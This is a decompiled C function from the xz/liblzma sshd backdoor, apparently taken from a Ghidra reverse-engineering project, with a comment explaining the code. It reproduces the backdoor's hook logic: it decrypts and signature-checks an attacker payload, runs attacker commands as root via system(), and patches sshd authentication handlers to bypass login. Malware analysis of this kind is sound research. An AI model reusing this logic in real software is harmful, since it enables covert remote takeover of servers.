// /home/kali/xzre-ghidra/xzregh/108EA0_mm_answer_keyallowed_hook.c
// Function: mm_answer_keyallowed_hook @ 0x108EA0
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_keyallowed_hook(ssh * ssh, int sock, sshbuf * m)


/*
 * AutoDoc: Drives the decrypted payload state machine: it extracts sshbuf chunks from the monitor message, pieces together and decrypts the
 * staged payload, validates signatures against the cached host_pubkeys, optionally runs privilege escalation (setresuid/setresgid
 * + system), and only then patches mm_answer_keyverify/mm_answer_authpassword before tail-calling the genuine
 * mm_answer_keyallowed. On failure it resets the payload_state and, if instructed, exits sshd entirely.
 */

#include "xzre_types.h"

int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)

{
  undefined1 *puVar1;
  char cVar2;
  u32 uVar3;
  libc_imports_t *plVar4;
  sshd_ctx_t *psVar5;
  sshd_monitor_func_t *UNRECOVERED_JUMPTABLE;
  ulong uVar6;
  sshd_ctx_t *psVar7;
  void *pvVar8;
  undefined8 uVar9;
  pfn_exit_t ppVar10;
  global_context_t *ctx;
  BOOL BVar11;
  gid_t rgid;
  int iVar12;
  long lVar13;
  ulong uVar14;
  ulong uVar15;
  ssize_t sVar16;
  long lVar17;
  ulong uVar18;
  sshd_payload_ctx_t **ppsVar19;
  u8 *puVar20;
  u8 *puVar21;
  uid_t ruid;
  ushort *puVar22;
  byte bVar23;
  sshbuf payload_buf;
  global_context_t *global_ctx;
  libc_imports_t *libc_imports;
  u8 local_131 [57];
  sshd_payload_ctx_t *payload_ctx;
  sshd_monitor_func_t orig_handler;
  u8 local_aa [122];
  
  ctx = ::global_ctx;
  bVar23 = 0;
  if (::global_ctx == (global_context_t *)0x0) {
    return 0;
  }
  plVar4 = ::global_ctx->libc_imports;
  if (plVar4 == (libc_imports_t *)0x0) {
    return 0;
  }
  psVar5 = ::global_ctx->sshd_ctx;
  if (psVar5 == (sshd_ctx_t *)0x0) {
    return 0;
  }
  if (::global_ctx->payload_data == (u8 *)0x0) {
    return 0;
  }
  UNRECOVERED_JUMPTABLE = psVar5->mm_answer_keyallowed_start;
  if (UNRECOVERED_JUMPTABLE == (sshd_monitor_func_t *)0x0) goto LAB_00109471;
  if (::global_ctx->payload_state == 4) goto LAB_0010944f;
  BVar11 = check_backdoor_state(::global_ctx);
  if (((BVar11 == FALSE) || (ctx->payload_state == 4)) || (ctx->payload_state == 0xffffffff))
  goto LAB_00109429;
  ppsVar19 = &payload_ctx;
  for (lVar17 = 0x12; lVar17 != 0; lVar17 = lVar17 + -1) {
    *(undefined4 *)ppsVar19 = 0;
    ppsVar19 = (sshd_payload_ctx_t **)((long)ppsVar19 + (ulong)bVar23 * -8 + 4);
  }
  libc_imports = (libc_imports_t *)0x0;
  BVar11 = sshbuf_extract(m,ctx,(void **)&payload_ctx,(size_t *)&orig_handler);
  if ((BVar11 == FALSE) ||
     (BVar11 = extract_payload_message
                         ((sshbuf *)&payload_ctx,(size_t)orig_handler,(size_t *)&libc_imports,ctx),
     BVar11 == FALSE)) goto LAB_0010944f;
  decrypt_payload_message((key_payload_t *)payload_ctx,(size_t)libc_imports,ctx);
  uVar3 = ctx->payload_state;
  if (uVar3 == 3) {
LAB_00109216:
    puVar22 = (ushort *)ctx->sshd_payload_ctx;
    if (puVar22 != (ushort *)0x0) {
      uVar15 = (ulong)*puVar22;
      cVar2 = *(char *)((long)puVar22 + 0x3b);
      uVar18 = uVar15 - 0x120;
      if (cVar2 == '\x02') {
        if ((((ctx->sshd_ctx->mm_answer_keyverify_ptr != (void *)0x0) && (4 < uVar18)) &&
            (uVar18 = (ulong)puVar22[0x57], puVar22[0x57] != 0)) &&
           ((uVar18 < uVar15 - 0x122 && (uVar15 = (uVar15 - 0x122) - uVar18, 2 < uVar15)))) {
          puVar1 = (undefined1 *)((long)puVar22 + uVar18 + 0xb0);
          *(undefined1 *)&psVar5->writebuf_size = *puVar1;
          *(undefined1 *)((long)&psVar5->writebuf_size + 1) = puVar1[1];
          if ((psVar5->writebuf_size == 0) || (uVar15 - 2 < (ulong)psVar5->writebuf_size)) {
            psVar5->writebuf_size = 0;
          }
          else {
            psVar7 = ctx->sshd_ctx;
            plVar4 = ctx->libc_imports;
            psVar5->writebuf = (u8 *)((long)puVar22 + uVar18 + 0xb2);
            pvVar8 = psVar7->mm_answer_keyverify;
            if (pvVar8 != (void *)0x0) {
              *(void **)psVar7->mm_answer_keyverify_ptr = pvVar8;
              sVar16 = fd_write(sock,puVar22 + 0x58,uVar18,plVar4);
              if (-1 < sVar16) {
                return 0;
              }
              goto LAB_0010944f;
            }
          }
        }
      }
      else if (cVar2 == '\x03') {
        if (((plVar4->system != (pfn_system_t)0x0) && (8 < uVar18)) &&
           (*(char *)((long)puVar22 + (uVar15 - 0x73)) == '\0')) {
          uVar9 = *(undefined8 *)(puVar22 + 0x57);
          rgid = (gid_t)((ulong)uVar9 >> 0x20);
          if (((rgid == 0) || (iVar12 = (*plVar4->setresgid)(rgid,rgid,rgid), iVar12 != -1)) &&
             ((ruid = (uid_t)uVar9, ruid == 0 ||
              (iVar12 = (*plVar4->setresuid)(ruid,ruid,ruid), iVar12 != -1)))) {
            (*plVar4->system)((char *)(puVar22 + 0x5b));
            ctx->payload_state = 4;
            goto LAB_0010944f;
          }
        }
      }
      else if (((cVar2 == '\x01') &&
               (ctx->sshd_ctx->mm_answer_authpassword_ptr != (sshd_monitor_func_t *)0x0)) &&
              (1 < uVar18)) {
        psVar5->authpayload_len_bytes[0] = (u8)puVar22[0x57];
        psVar5->authpayload_len_bytes[1] = *(u8 *)((long)puVar22 + 0xaf);
        if (*(ushort *)psVar5->authpayload_len_bytes == 0) {
          puVar22 = (ushort *)0x0;
        }
        else {
          puVar22 = puVar22 + 0x58;
          if (uVar15 - 0x122 < (ulong)*(ushort *)psVar5->authpayload_len_bytes) {
            psVar5->authpayload_len_bytes[0] = '\0';
            psVar5->authpayload_len_bytes[1] = '\0';
            goto LAB_00109429;
          }
        }
        psVar5->pending_authpayload = (sshd_payload_ctx_t *)puVar22;
        ctx->payload_state = 4;
        BVar11 = sshd_patch_variables(TRUE,FALSE,FALSE,0,ctx);
LAB_001092e5:
        if (BVar11 != FALSE) goto LAB_0010944f;
      }
    }
  }
  else if ((int)uVar3 < 4) {
    if (uVar3 == 0) {
      if (ctx->current_data_size < 0xae) goto LAB_0010944f;
      puVar21 = local_131 + 0x10;
      for (lVar17 = 0x29; lVar17 != 0; lVar17 = lVar17 + -1) {
        *puVar21 = '\0';
        puVar21 = puVar21 + (ulong)bVar23 * -2 + 1;
      }
      puVar21 = ctx->payload_data;
      local_131[0] = '\0';
      local_131[1] = '\0';
      local_131[2] = '\0';
      local_131[3] = '\0';
      local_131[4] = '\0';
      local_131[5] = '\0';
      local_131[6] = '\0';
      local_131[7] = '\0';
      local_131[8] = '\0';
      local_131[9] = '\0';
      local_131[10] = '\0';
      local_131[0xb] = '\0';
      local_131[0xc] = '\0';
      local_131[0xd] = '\0';
      local_131[0xe] = '\0';
      local_131[0xf] = '\0';
      if (((puVar21 != (u8 *)0x0) && (ctx->sshd_sensitive_data != (sensitive_data *)0x0)) &&
         ((ctx->sshd_sensitive_data->host_pubkeys != (sshkey **)0x0 &&
          (ctx->sshd_payload_ctx == (sshd_payload_ctx_t *)0x0)))) {
        ctx->sshd_payload_ctx = puVar21;
        local_aa[0] = '\0';
        local_aa[1] = '\0';
        local_aa[2] = '\0';
        local_aa[3] = '\0';
        local_aa[4] = '\0';
        local_aa[5] = '\0';
        local_aa[6] = '\0';
        local_aa[7] = '\0';
        local_aa[8] = '\0';
        local_aa[9] = '\0';
        local_aa[10] = '\0';
        local_aa[0xb] = '\0';
        local_aa[0xc] = '\0';
        local_aa[0xd] = '\0';
        local_aa[0xe] = '\0';
        local_aa[0xf] = '\0';
        puVar20 = local_aa + 0x10;
        for (lVar17 = 0x4a; lVar17 != 0; lVar17 = lVar17 + -1) {
          *puVar20 = '\0';
          puVar20 = puVar20 + (ulong)bVar23 * -2 + 1;
        }
        lVar17 = 0;
        do {
          local_aa[lVar17] = puVar21[lVar17 + 2];
          lVar17 = lVar17 + 1;
        } while (lVar17 != 0x3a);
        BVar11 = secret_data_get_decrypted(local_131,ctx);
        if ((BVar11 != FALSE) &&
           (BVar11 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys
                                      [ctx->sshd_host_pubkey_idx],local_aa,0x3a,0x5a,
                                      ctx->sshd_payload_ctx + 0x3c,local_131,ctx), BVar11 != FALSE))
        {
          ctx->payload_state = 1;
          puVar21 = local_131;
          for (lVar17 = 0x39; lVar17 != 0; lVar17 = lVar17 + -1) {
            *puVar21 = '\0';
            puVar21 = puVar21 + (ulong)bVar23 * -2 + 1;
          }
          BVar11 = check_backdoor_state(ctx);
          goto LAB_001092e5;
        }
      }
      ctx->payload_state = 0xffffffff;
      ctx->sshd_payload_ctx = (sshd_payload_ctx_t *)0x0;
    }
    else if ((uVar3 == 1) && ((ushort *)ctx->sshd_payload_ctx != (ushort *)0x0)) {
      uVar15 = (ulong)*(ushort *)ctx->sshd_payload_ctx;
      uVar18 = ctx->current_data_size;
      if (uVar18 <= uVar15) {
        if (uVar18 != uVar15) goto LAB_0010944f;
        uVar15 = ctx->payload_data_size;
        uVar6 = ctx->sock_read_buf_size;
        if ((uVar15 < uVar6) || (uVar18 = uVar18 - 0x72, uVar15 - uVar6 <= uVar18)) {
LAB_00109471:
          if (plVar4->exit != (pfn_exit_t)0x0) {
            (*plVar4->exit)(0);
          }
          return 0;
        }
        local_aa[0] = '\0';
        local_aa[1] = '\0';
        local_aa[2] = '\0';
        local_aa[3] = '\0';
        local_aa[4] = '\0';
        local_aa[5] = '\0';
        local_aa[6] = '\0';
        local_aa[7] = '\0';
        local_aa[8] = '\0';
        local_aa[9] = '\0';
        local_aa[10] = '\0';
        local_aa[0xb] = '\0';
        local_aa[0xc] = '\0';
        local_aa[0xd] = '\0';
        local_aa[0xe] = '\0';
        local_aa[0xf] = '\0';
        puVar21 = local_aa + 0x10;
        for (lVar17 = 0x62; lVar17 != 0; lVar17 = lVar17 + -1) {
          *puVar21 = '\0';
          puVar21 = puVar21 + (ulong)bVar23 * -2 + 1;
        }
        puVar21 = ctx->payload_data;
        lVar17 = 0;
        do {
          lVar13 = lVar17 + 1;
          local_aa[lVar17] = puVar21[lVar17 + uVar18];
          lVar17 = lVar13;
        } while (lVar13 != 0x72);
        if ((uVar15 < uVar18) || (uVar14 = 0, uVar15 - uVar18 < uVar6)) goto LAB_00109471;
        for (; uVar6 != uVar14; uVar14 = uVar14 + 1) {
          puVar21[uVar14 + uVar18] = ctx->sock_read_buf[uVar14];
        }
        BVar11 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
                                  ctx->payload_data,uVar18 + ctx->sock_read_buf_size,
                                  ctx->payload_data_size,local_aa,ctx->sshd_payload_ctx + 2,ctx);
        if (BVar11 == FALSE) {
          ctx->payload_state = 0xffffffff;
          goto LAB_00109471;
        }
        ctx->payload_state = 3;
        goto LAB_00109216;
      }
    }
  }
  else if (uVar3 == 4) goto LAB_0010944f;
LAB_00109429:
  if (((ctx->libc_imports != (libc_imports_t *)0x0) &&
      (ppVar10 = ctx->libc_imports->exit, ppVar10 != (pfn_exit_t)0x0)) &&
     (ctx->payload_state = 0xffffffff, ctx->exit_flag != 0)) {
    (*ppVar10)(0);
  }
LAB_0010944f:
                    /* WARNING: Could not recover jumptable at 0x0010946f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar12 = (*(code *)UNRECOVERED_JUMPTABLE)(ssh,sock,m);
  return iVar12;
}

